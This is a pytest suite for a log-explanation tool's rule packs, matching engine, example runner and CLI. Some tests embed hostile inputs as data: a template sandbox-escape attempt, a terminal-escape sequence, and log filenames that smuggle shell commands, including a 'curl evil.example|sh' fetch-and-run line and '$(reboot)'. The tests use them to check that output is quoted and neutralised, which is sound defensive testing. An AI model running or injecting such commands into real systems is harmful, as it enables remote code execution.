"""Phase 4: rule-pack loading and validation, the explanation engine, the example runner
(the CI gate for every shipped rule) and the explain/rules CLI commands."""

import logging
import textwrap
from datetime import UTC, datetime
from io import StringIO
from pathlib import Path

import pytest

from loglens.cli import cmd_explain, cmd_rules_lint, cmd_rules_test, main
from loglens.core.models import Category, LogEntry, LogSource, Severity, SourceKind
from loglens.explain import DEFAULT_RULES_DIR, ExplanationEngine, load_rules
from loglens.explain.examples import parse_line, run_examples

FIXTURES = Path(__file__).parent / "fixtures" / "logs"
T0 = datetime(2026, 11, 18, 12, 0, tzinfo=UTC)
MIN_RULES_PER_PACK = 15


def entry(message: str, source_id: str = "file:/var/log/x.log", **fields: object) -> LogEntry:
    return LogEntry(0, source_id, T0, Severity.INFO, message, message, fields)


def write_pack(directory: Path, text: str, name: str = "demo.yaml") -> Path:
    path = directory / name
    path.write_text(textwrap.dedent(text).lstrip(), encoding="utf-8")
    return path


GOOD_RULE = """
  - id: demo.hello
    title: "Hello {{ who }}"
    match:
      regex: hello (?P<who>\\w+)
    template: "Someone greeted {{ who }}."
    category: info
    examples:
      - line: hello world
        expect: {text: Someone greeted world.}
    counter_examples: [goodbye]
"""
HEADER = """
pack: demo
version: 1
example_source: file:/var/log/demo.log
rules:
"""


# ---------------------------------------------------------------- shipped packs (CI gate)


@pytest.fixture(scope="module")
def shipped() -> ExplanationEngine:
    return ExplanationEngine(load_rules())


def test_shipped_packs_load_cleanly(shipped: ExplanationEngine) -> None:
    assert shipped.issues == ()
    names = {p.name for p in shipped.packs}
    assert {"squid", "clamav", "docker", "compose", "sshd", "nginx", "systemd", "kernel"} <= names


def test_every_pack_has_enough_rules_with_both_kinds_of_examples(
    shipped: ExplanationEngine,
) -> None:
    for pack in shipped.packs:
        assert len(pack.rules) >= MIN_RULES_PER_PACK, pack.name
        for rule in pack.rules:
            assert rule.examples and rule.counter_examples, rule.id


def test_every_shipped_example_passes(shipped: ExplanationEngine, local_tz: None) -> None:
    report = run_examples(shipped)
    assert report.rules == len(shipped.rules)
    assert not report.failures, "\n".join(map(str, report.failures))


def test_no_rule_no_explanation(shipped: ExplanationEngine) -> None:
    """Never guess: lines no rule recognizes stay unexplained."""
    for line in ("just some text", "", "Process ID 1450", "\x00\xffbinary"):
        assert shipped.explain(parse_line(line, "file:/var/log/squid/cache.log")) is None


def test_squid_denied_explanation_is_concrete(shipped: ExplanationEngine) -> None:
    line = "1794955801.456 0 10.0.0.5 TCP_DENIED/403 3922 CONNECT facebook.com:443 - HIER_NONE/- -"
    got = shipped.explain(parse_line(line, "file:/var/log/squid/access.log"))
    assert got is not None
    assert got.rule_id == "squid.access.denied_connect"
    assert "10.0.0.5" in got.plain_text and "facebook.com" in got.plain_text
    assert got.category is Category.SECURITY
    assert got.suggested_action and got.probable_cause


# ---------------------------------------------------------------- loading and validation


def test_invalid_rules_are_reported_with_line_and_skipped(tmp_path: Path) -> None:
    path = write_pack(
        tmp_path,
        HEADER
        + GOOD_RULE
        + """
  - id: demo.no_examples
    title: t
    match: {regex: x}
    template: t
    category: info
    examples: []
    counter_examples: [y]
  - id: demo.bad_regex
    title: t
    match: {regex: "(unclosed"}
    template: t
    category: info
    examples: [{line: a, expect: {text: t}}]
    counter_examples: [b]
  - id: demo.unknown_var
    title: t
    match: {regex: x}
    template: "{{ nope }}"
    category: info
    examples: [{line: a, expect: {text: t}}]
    counter_examples: [b]
  - id: demo.hello
    title: duplicate
    match: {regex: x}
    template: t
    category: info
    examples: [{line: a, expect: {text: t}}]
    counter_examples: [b]
  - id: other.prefix
    title: t
    match: {regex: x}
    template: t
    category: info
    examples: [{line: a, expect: {text: t}}]
    counter_examples: [b]
  - id: demo.bad_template
    title: t
    match: {regex: x}
    template: "{% if %}"
    category: info
    examples: [{line: a, expect: {text: t}}]
    counter_examples: [b]
  - id: demo.yaml_trap
    title: t
    match: {on: status, regex: x}
    template: t
    category: info
    examples: [{line: a, expect: {text: t}}]
    counter_examples: [b]
""",
    )
    ruleset = load_rules(tmp_path)
    assert [r.id for r in ruleset.rules] == ["demo.hello"]
    by_rule = {i.rule_id: i for i in ruleset.issues}
    assert by_rule["demo.no_examples"].line == 22  # the "examples: []" line
    assert "should be non-empty" in by_rule["demo.no_examples"].message
    assert "bad regex" in by_rule["demo.bad_regex"].message
    assert by_rule["demo.bad_regex"].line == 26  # its match: line
    assert "nope" in by_rule["demo.unknown_var"].message
    assert "bad template" in by_rule["demo.bad_template"].message
    assert "must start with 'demo.'" in by_rule["other.prefix"].message
    assert any(i.message == "duplicate rule id" for i in ruleset.issues)
    assert "True" in by_rule["demo.yaml_trap"].message  # YAML 1.1 turns `on:` into True
    assert str(by_rule["demo.bad_regex"]).startswith(f"{path}:26: [demo.bad_regex] ")


@pytest.mark.parametrize(
    ("text", "line", "message"),
    [
        ("pack: demo\nversion: 1\nrules: [\n", 4, "invalid YAML"),
        ("- just\n- a list\n", 1, "must be a mapping"),
        ("pack: Demo\nversion: 1\nexample_source: x\nrules: []\n", 1, "pack"),
        ("pack: demo\nversion: 2\nexample_source: x\nrules: []\n", 2, "version"),
    ],
)
def test_bad_pack_files_are_reported(tmp_path: Path, text: str, line: int, message: str) -> None:
    (tmp_path / "bad.yaml").write_text(text, encoding="utf-8")
    write_pack(tmp_path, HEADER + GOOD_RULE, "good.yaml")
    ruleset = load_rules(tmp_path)
    assert [r.id for r in ruleset.rules] == ["demo.hello"]  # the good pack still loads
    (issue,) = ruleset.issues
    assert (issue.line, issue.path.name) == (line, "bad.yaml")
    assert message in issue.message


def test_unreadable_pack_and_missing_directory(tmp_path: Path) -> None:
    (tmp_path / "latin1.yaml").write_bytes(b"pack: d\xe9mo\n")
    (issue,) = load_rules(tmp_path).issues
    assert "cannot read" in issue.message
    (issue,) = load_rules(tmp_path / "nope").issues
    assert issue.message == "rules directory not found"


def test_file_sources_catalog_is_not_a_pack() -> None:
    assert all(p.path.name != "file_sources.yaml" for p in load_rules().packs)


def test_from_directory_logs_problems_and_filters_packs(
    tmp_path: Path, caplog: pytest.LogCaptureFixture
) -> None:
    write_pack(tmp_path, HEADER + GOOD_RULE)
    write_pack(tmp_path, "nonsense: [", "broken.yaml")
    with caplog.at_level(logging.WARNING):
        engine = ExplanationEngine.from_directory(tmp_path, packs=["demo"])
    assert [p.name for p in engine.packs] == ["demo"]
    assert "broken.yaml" in caplog.text
    assert ExplanationEngine.from_directory(tmp_path, packs=["other"]).rules == ()


# ---------------------------------------------------------------- matching semantics


def engine_for(tmp_path: Path, rules: str, header: str = HEADER) -> ExplanationEngine:
    write_pack(tmp_path, header + rules)
    engine = ExplanationEngine(load_rules(tmp_path))
    assert engine.issues == (), engine.issues
    return engine


def rule(rule_id: str, match: str, template: str, extra: str = "") -> str:
    return f"""
  - id: demo.{rule_id}
    title: "{rule_id}"
    match: {match}
    template: "{template}"
    category: security
{extra}    examples: [{{line: a, expect: {{text: t}}}}]
    counter_examples: [b]
"""


def test_field_conditions_regex_on_field_and_extract(tmp_path: Path) -> None:
    engine = engine_for(
        tmp_path,
        rule(
            "deny",
            "{fields: {status: [403, 407], cache_result: TCP_DENIED}, field: url, regex: '^https?://(?P<host>[^/]+)'}",
            "{{ client_ip }} -> {{ host }}{% if user %} as {{ user }}{% endif %}",
            "    extract: [client_ip]\n    optional: [user]\n    severity_override: warning\n",
        ),
    )
    fields = {"status": 403, "cache_result": "TCP_DENIED", "client_ip": "10.0.0.5"}
    got = engine.explain(entry("x", url="http://a.example/x", **fields))
    assert got is not None
    assert got.plain_text == "10.0.0.5 -> a.example"
    assert got.severity_assessment is Severity.WARNING
    assert got.category is Category.SECURITY and got.confidence == 0.9
    assert engine.explain(entry("x", url="http://a/", **fields, user="bob")).plain_text.endswith(
        "as bob"
    )
    assert engine.explain(entry("x", url="http://a/", **{**fields, "status": 200})) is None
    assert engine.explain(entry("x", url="ftp-ish", **fields)) is None  # regex misses
    assert engine.explain(entry("x", **fields)) is None  # regex field missing
    no_ip = {k: v for k, v in fields.items() if k != "client_ip"}
    assert engine.explain(entry("x", url="http://a/", **no_ip)) is None  # required extract


def test_bool_conditions_raw_field_and_severity_default(tmp_path: Path) -> None:
    engine = engine_for(
        tmp_path,
        rule("flag", "{fields: {invalid: true}}", "flagged")
        + rule("raw", "{field: raw, regex: '^RAW'}", "raw matched"),
    )
    got = engine.explain(entry("msg", invalid=True))
    assert got is not None and got.rule_id == "demo.flag"
    assert got.severity_assessment is Severity.INFO  # no override: the entry's own severity
    raw = LogEntry(0, "file:/x", T0, Severity.ERROR, "stripped", "RAW line", {})
    assert engine.explain(raw).rule_id == "demo.raw"  # type: ignore[union-attr]


def test_long_values_are_clipped_and_whitespace_collapsed(tmp_path: Path) -> None:
    engine = engine_for(tmp_path, rule("long", "{regex: '(?P<v>x+)'}", "  value:\\n {{ v }}  "))
    got = engine.explain(entry("x" * 1000))
    assert got is not None
    assert got.plain_text.startswith("value: xxx") and got.plain_text.endswith("…")
    assert len(got.plain_text) == len("value: ") + 200


def test_regex_only_scans_the_first_4096_chars(tmp_path: Path) -> None:
    engine = engine_for(tmp_path, rule("late", "{regex: NEEDLE}", "found"))
    assert engine.explain(entry("." * 5000 + "NEEDLE")) is None
    assert engine.explain(entry("." * 100 + "NEEDLE")) is not None


def test_selectors_source_parser_and_program(tmp_path: Path) -> None:
    header = """
pack: demo
version: 1
example_source: file:/var/log/demo.log
applies_to: {paths: ["/var/log/demo*"], parsers: [squid], programs: [kernel]}
rules:
"""
    engine = engine_for(tmp_path, rule("any", "{regex: boom}", "boom"), header)
    assert engine.explain(entry("boom", "file:/var/log/demo.log")) is not None  # path
    assert engine.explain(entry("boom", "file:/var/log/other.log")) is None
    assert engine.explain(entry("boom", "file:/var/log/other.log", parser="squid")) is not None
    assert engine.explain(entry("boom", "systemd:x.service", program="kernel")) is not None
    assert engine.explain(entry("boom", "docker:c", SYSLOG_IDENTIFIER="kernel")) is not None
    assert engine.explain(entry("boom", "weird-id-without-kind")) is None
    # A discovered source passed explicitly wins over the id: its metadata is richer.
    source = LogSource(
        "docker:c", SourceKind.DOCKER_CONTAINER, "c", "", metadata={"path": "/var/log/demo"}
    )
    assert engine.explain(entry("boom", "docker:c"), source) is not None


def test_rule_level_applies_to_overrides_the_pack(tmp_path: Path) -> None:
    header = HEADER.replace("rules:", 'applies_to: {paths: ["/nowhere"]}\nrules:')
    engine = engine_for(
        tmp_path,
        rule("scoped", "{regex: boom}", "boom", '    applies_to: {units: ["x.service"]}\n'),
        header,
    )
    assert engine.explain(entry("boom", "systemd:x.service")) is not None
    assert engine.explain(entry("boom", "file:/nowhere")) is None


def test_first_matching_rule_wins(tmp_path: Path) -> None:
    engine = engine_for(
        tmp_path,
        rule("specific", "{regex: 'disk full'}", "specific")
        + rule("generic", "{regex: disk}", "g"),
    )
    assert engine.explain(entry("disk full")).rule_id == "demo.specific"  # type: ignore[union-attr]
    assert engine.explain(entry("disk ok")).rule_id == "demo.generic"  # type: ignore[union-attr]


def test_sandbox_and_render_errors_mean_no_explanation(
    tmp_path: Path, caplog: pytest.LogCaptureFixture
) -> None:
    engine = engine_for(
        tmp_path,
        rule("escape", "{regex: escape}", "{{ message.__class__.__mro__ }}")
        + rule("typeerr", "{regex: typeerr}", "{{ message + 1 }}")
        + rule("empty", "{regex: empty}", "{{ '' }}"),
    )
    with caplog.at_level(logging.ERROR):
        assert engine.explain(entry("escape")) is None
        assert engine.explain(entry("escape")) is None
        assert engine.explain(entry("typeerr")) is None
        assert engine.explain(entry("empty")) is None
    assert caplog.text.count("rule failed to render") == 2  # once per broken rule


# ---------------------------------------------------------------- example runner


def test_example_runner_reports_each_kind_of_failure(tmp_path: Path) -> None:
    engine = engine_for(
        tmp_path,
        """
  - id: demo.shadow
    title: t
    match: {regex: disk}
    template: generic disk
    category: info
    examples: [{line: disk, expect: {text: generic disk}}]
    counter_examples: [disk again]
  - id: demo.shadowed
    title: t
    match: {regex: disk full}
    template: full
    category: info
    examples: [{line: disk full, expect: {text: full}}]
    counter_examples: [nothing]
  - id: demo.wrong
    title: Title
    match: {regex: wrong}
    template: actual text
    category: info
    examples:
      - {line: wrong, expect: {text: expected text, title: Title, severity: info, category: info}}
      - {line: unmatched, expect: {text: x}}
    counter_examples: [ok]
""",
    )
    report = run_examples(engine)
    problems = sorted((f.rule.id, f.problem.split("\n")[0]) for f in report.failures)
    assert problems == [
        ("demo.shadow", "counter-example matched"),
        ("demo.shadowed", "example explained by demo.shadow instead"),
        ("demo.wrong", "example not explained by any rule"),
        ("demo.wrong", "output differs"),
    ]
    wrong = next(f for f in report.failures if f.problem.startswith("output"))
    assert "expected 'expected text'" in str(wrong) and "got      'actual text'" in str(wrong)
    assert run_examples(engine, packs=["other"]).rules == 0


# ---------------------------------------------------------------- CLI


def test_cli_explain_with_pack_prints_explanations_and_summary(local_tz: None) -> None:
    out = StringIO()
    assert cmd_explain(FIXTURES / "squid_access.log", "squid", None, out=out) == 0
    text = out.getvalue()
    assert "=> Blocked HTTPS site: facebook.com  [notice, security]" in text
    assert "Squid blocked 10.0.0.5 from opening a secure connection to facebook.com." in text
    assert "(no explanation available)" in text
    assert "entries explained." in text
    assert f"file:{FIXTURES / 'squid_access.log'}: 35 events" in text


def test_cli_explain_default_source_and_errors(tmp_path: Path) -> None:
    log = tmp_path / "x.log"
    log.write_text("hello\n", encoding="utf-8")
    out = StringIO()
    assert cmd_explain(log, None, None, out=out) == 0
    assert "0 of 1 entries explained." in out.getvalue()
    assert cmd_explain(tmp_path / "missing.log", None, None, out=StringIO()) == 1
    with pytest.raises(ValueError, match="no rule pack named 'nope'"):
        cmd_explain(log, "nope", None, out=StringIO())
    empty = tmp_path / "empty.log"
    empty.write_text("", encoding="utf-8")
    assert cmd_explain(empty, "file:/var/log/auth.log", None, out=StringIO()) == 0


def test_cli_explain_neutralizes_terminal_escapes(tmp_path: Path) -> None:
    log = tmp_path / "evil.log"
    log.write_text(
        "1794955801.456 0 10.0.0.5 TCP_DENIED/403 1 CONNECT evil\x1b[31m.com:443 - HIER_NONE/- -\n",
        encoding="utf-8",
    )
    out = StringIO()
    cmd_explain(log, "squid", None, out=out)
    assert "\x1b" not in out.getvalue()


def test_cli_rules_lint_and_test(tmp_path: Path) -> None:
    out = StringIO()
    assert cmd_rules_lint(None, out=out) == 0
    assert out.getvalue().endswith(" problems\n") and ", 0 problems" in out.getvalue()
    write_pack(tmp_path, HEADER + GOOD_RULE.replace("Someone greeted world.", "Wrong."))
    write_pack(tmp_path, "pack: x\n", "broken.yaml")
    out = StringIO()
    assert cmd_rules_lint(tmp_path, out=out) == 1
    assert "broken.yaml:1:" in out.getvalue()
    out = StringIO()
    assert cmd_rules_test(tmp_path, None, out=out) == 1
    text = out.getvalue()
    assert "load: " in text and "output differs" in text and "1 failures" in text


def test_cli_rules_test_all_shipped_packs_pass(local_tz: None) -> None:
    out = StringIO()
    assert cmd_rules_test(DEFAULT_RULES_DIR, ["squid"], out=out) == 0
    assert out.getvalue().endswith("0 failures\n")


def test_main_dispatches_explain_and_rules(
    capsys: pytest.CaptureFixture[str], tmp_path: Path
) -> None:
    assert main(["rules", "lint"]) == 0
    assert main(["rules", "test", "--pack", "clamav"]) == 0
    assert main(["explain", "--file", str(FIXTURES / "clamav.log"), "--source", "clamav"]) == 0
    assert "ClamAV found malware (Doc.Dropper.Agent-1540415)" in capsys.readouterr().out
    assert main(["explain", "--file", str(tmp_path / "x"), "--source", "nope"]) == 2


# ---------------------------------------------------------------- copy-paste safety


def test_action_values_must_be_shell_quoted(tmp_path: Path) -> None:
    write_pack(
        tmp_path,
        HEADER
        + rule("unquoted", "{regex: '(?P<f>\\\\S+)'}", "t", '    action: "rm {{ f }}"\n')
        + rule("quoted", "{regex: '(?P<f>\\\\S+)'}", "t", '    action: "ls {{ f | shquote }}"\n')
        + rule(
            "literal",
            "{regex: x}",
            "t",
            "    action: \"docker inspect -f '{{ '{{' }}.X{{ '}}' }}'\"\n",
        ),
    )
    ruleset = load_rules(tmp_path)
    assert [r.id for r in ruleset.rules] == ["demo.quoted", "demo.literal"]
    (issue,) = ruleset.issues
    assert issue.rule_id == "demo.unquoted" and "| shquote" in issue.message


@pytest.mark.parametrize(
    ("line", "rule_id", "quoted"),
    [
        (
            "/tmp/x; curl evil.example|sh: Win.Trojan.Agent-1 FOUND",
            "clamav.scan.found",
            "'/tmp/x; curl evil.example|sh'",
        ),
        (
            "/tmp/a$(reboot): Access denied. ERROR",
            "clamav.scan.access_denied",
            "clamdscan --fdpass '/tmp/a$(reboot)'",
        ),
    ],
)
def test_hostile_log_values_stay_one_shell_word(
    shipped: ExplanationEngine, line: str, rule_id: str, quoted: str
) -> None:
    got = shipped.explain(parse_line(line, "file:/var/log/clamav/clamav.log"))
    assert got is not None
    assert got.rule_id == rule_id
    assert quoted in (got.suggested_action or "")
